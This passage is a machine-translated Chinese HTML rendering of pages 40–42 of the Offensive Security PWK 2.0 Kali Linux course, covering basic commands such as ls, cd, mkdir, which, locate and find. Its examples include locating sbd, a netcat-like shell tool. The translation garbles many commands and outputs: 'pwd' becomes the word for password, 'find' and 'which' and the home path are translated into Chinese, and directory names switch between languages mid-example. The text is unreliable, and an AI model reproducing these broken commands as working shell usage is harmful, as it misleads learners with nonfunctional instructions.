<div style="position:absolute;top:46276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gparted (8)    </font></font></nobr></div>
<div style="position:absolute;top:46276;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 用于操作磁盘分区的 GNOME 分区编辑器。</font></font></nobr></div>
<div style="position:absolute;top:46293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:46359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Regular_expression</font></font></font></nobr></div>
<div style="position:absolute;top:46379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 信息项目，2004 年），http://www.linfo.org/apropos.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46636;left:189"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 7 - 使用 apropos 查找将“partition”作为其描述的一部分的命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apropos</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎执行与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man -k</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相同的功能</font><font style="vertical-align: inherit;">；</font><font style="vertical-align: inherit;">事实上，它们是等价的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:46700;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2.3 列出文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令打印出一个基本的文件列表屏幕。</font><font style="vertical-align: inherit;">我们可以修改输出结果</font></font></nobr></div>
<div style="position:absolute;top:46754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种通配符。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于显示所有文件（包括隐藏的）和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></nobr></div>
<div style="position:absolute;top:46773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在一行中显示每个文件，这对于自动化非常有用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:46825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面文档下载音乐图片公共模板视频</font></font></nobr></div>
<div style="position:absolute;top:46859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls /etc/apache2/sites-available/*.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:46876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/apache2/sites-available/000-default.conf</font></font></nobr></div>
<div style="position:absolute;top:46893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/apache2/sites-available/default-ssl.conf</font></font></nobr></div>
<div style="position:absolute;top:46926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -a1</font></font></font></b></nobr></div>
<div style="position:absolute;top:46944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:46961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:46978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.bash_history</font></font></nobr></div>
<div style="position:absolute;top:46994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.bashrc</font></font></nobr></div>
<div style="position:absolute;top:47011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.cache</font></font></nobr></div>
<div style="position:absolute;top:47028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.config</font></font></nobr></div>
<div style="position:absolute;top:47045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面</font></font></nobr></div>
<div style="position:absolute;top:47062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></nobr></div>
<div style="position:absolute;top:47079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:47099;left:397"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 8 - 列出文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47129;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2.4 四处走动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 不使用 Windows 风格的驱动器号。</font><font style="vertical-align: inherit;">相反，所有文件、文件夹和设备都是子项</font></font></nobr></div>
<div style="position:absolute;top:47183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根目录，用“/”字符表示。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令后跟一个</font></font></nobr></div>
<div style="position:absolute;top:47203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要更改到指定目录的路径。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWD</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将打印当前目录（</font></font></nobr></div>
<div style="position:absolute;top:47222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果你迷路了会很有帮助）并且运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd ~</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将返回到主目录。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/share/metasploit-framework/</font></font></font></b></nobr></div>
<div style="position:absolute;top:47291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/metasploit-framework$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:47308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/metasploit-framework</font></font></nobr></div>
<div style="position:absolute;top:47342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/metasploit-framework$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd ~</font></font></font></b></nobr></div>
<div style="position:absolute;top:47376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></font></b></nobr></div>
<div style="position:absolute;top:47393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/卡利</font></font></nobr></div>
<div style="position:absolute;top:47412;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 9 - 在文件系统中移动</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47443;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2.5 创建目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟目录名称</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令创建指定的目录。</font><font style="vertical-align: inherit;">目录</font></font></nobr></div>
<div style="position:absolute;top:47497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称可以包含空格，但由于我们将在命令行上花费大量时间，因此我们将</font></font></nobr></div>
<div style="position:absolute;top:47516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用连字符或下划线可以避免很多麻烦。</font><font style="vertical-align: inherit;">这些字符将</font></font></nobr></div>
<div style="position:absolute;top:47536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使自动完成（使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键</font><font style="vertical-align: inherit;">执行</font><font style="vertical-align: inherit;">）更容易完成。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir 笔记</font></font></font></b></nobr></div>
<div style="position:absolute;top:47860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd 笔记/</font></font></font></b></nobr></div>
<div style="position:absolute;top:47894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir 模块一</font></font></font></b></nobr></div>
<div style="position:absolute;top:47928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:47944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块一</font></font></nobr></div>
<div style="position:absolute;top:47979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rm -rf 模块/一个/</font></font></font></b></nobr></div>
<div style="position:absolute;top:48013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir "模块一"</font></font></font></b></nobr></div>
<div style="position:absolute;top:48046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd module\ one/</font></font></font></b></nobr></div>
<div style="position:absolute;top:48080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/notes/module one$</font></font></nobr></div>
<div style="position:absolute;top:48100;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 10 - 在 Kali 中创建目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用非常有用的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir -p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一次创建多个目录</font><font style="vertical-align: inherit;">，这也将</font></font></nobr></div>
<div style="position:absolute;top:48149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建任何所需的父目录。</font><font style="vertical-align: inherit;">这可以与大括号扩展相结合以有效地</font></font></nobr></div>
<div style="position:absolute;top:48168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，创建一个目录结构来存储您的渗透测试笔记。</font><font style="vertical-align: inherit;">在下面的例子中，</font></font></nobr></div>
<div style="position:absolute;top:48187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在创建一个名为 test 的目录，并在该目录中创建三个名为的子目录</font></font></nobr></div>
<div style="position:absolute;top:48207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦察、利用和报告：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir -p test/{recon,exploit,report}</font></font></font></b></nobr></div>
<div style="position:absolute;top:48275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 测试/</font></font></font></b></nobr></div>
<div style="position:absolute;top:48292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发</font></font></nobr></div>
<div style="position:absolute;top:48309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦察</font></font></nobr></div>
<div style="position:absolute;top:48326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告</font></font></nobr></div>
<div style="position:absolute;top:48346;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 11 - 创建目录结构</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:48377;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3 在 Kali Linux 中查找文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于在 Kali Linux 中定位文件的三个最常见的 Linux 命令包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">locate</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></nobr></div>
<div style="position:absolute;top:48434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哪个</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这些实用程序有相似之处，但以不同的方式工作和返回数据，因此</font></font></nobr></div>
<div style="position:absolute;top:48453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在不同的情况下使用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:48488;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3.1 其中</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在中定义的目录搜索</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ PATH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境</font></font></nobr></div>
<div style="position:absolute;top:48542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给定文件名的变量。</font><font style="vertical-align: inherit;">此变量包含 Kali 搜索的目录列表</font></font></nobr></div>
<div style="position:absolute;top:48561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发出的命令没有其路径。</font><font style="vertical-align: inherit;">如果找到匹配项，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">则</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回文件的完整路径为</font></font></nobr></div>
<div style="position:absolute;top:48581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $PATH</font></font></font></b></nobr></div>
<div style="position:absolute;top:48632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</font></font></nobr></div>
<div style="position:absolute;top:48666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">which sbd</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:48683;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/sbd</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:48755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2019），https://linux.die.net/man/1/which</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49012;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 12 - 探索 which 命令</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:49042;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3.2 定位</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就是找到的文件和目录的卡利位置的最快方式。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:49096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了提供更短的搜索时间，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">locate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索名为 locate.db 的内置数据库</font></font></nobr></div>
<div style="position:absolute;top:49116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不是整个硬盘本身。</font><font style="vertical-align: inherit;">该数据库由以下人员定期自动更新</font></font></nobr></div>
<div style="position:absolute;top:49135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cron的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调度。</font><font style="vertical-align: inherit;">要手动更新 locate.db 数据库，您可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">updatedb</font></font></font></b></nobr></div>
<div style="position:absolute;top:49155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo updatedb</font></font></font></b></nobr></div>
<div style="position:absolute;top:49224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 sbd.exe</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:49240;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/sbd/sbd.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49260;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 13 - 探索 locate 命令</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:49291;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3.3 查找</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是三者中最复杂和灵活的搜索工具。</font><font style="vertical-align: inherit;">掌握其</font></font></nobr></div>
<div style="position:absolute;top:49344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法有时可能很棘手，但它的功能超出了正常的文件搜索。</font><font style="vertical-align: inherit;">最基本的</font></font></nobr></div>
<div style="position:absolute;top:49364;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的</font><font style="vertical-align: inherit;">用法</font><font style="vertical-align: inherit;">如清单 14 所示，我们执行递归搜索，开始</font></font></nobr></div>
<div style="position:absolute;top:49383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从根文件系统目录中查找以字母“sbd”开头的任何文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo find / -name sbd*</font></font></font></b></nobr></div>
<div style="position:absolute;top:49435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin/sbd</font></font></nobr></div>
<div style="position:absolute;top:49452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/doc/sbd</font></font></nobr></div>
<div style="position:absolute;top:49469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/sbd</font></font></nobr></div>
<div style="position:absolute;top:49486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/sbd/sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:49503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/sbd/sbdbg.exe</font></font></nobr></div>
<div style="position:absolute;top:49520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb</font></font></nobr></div>
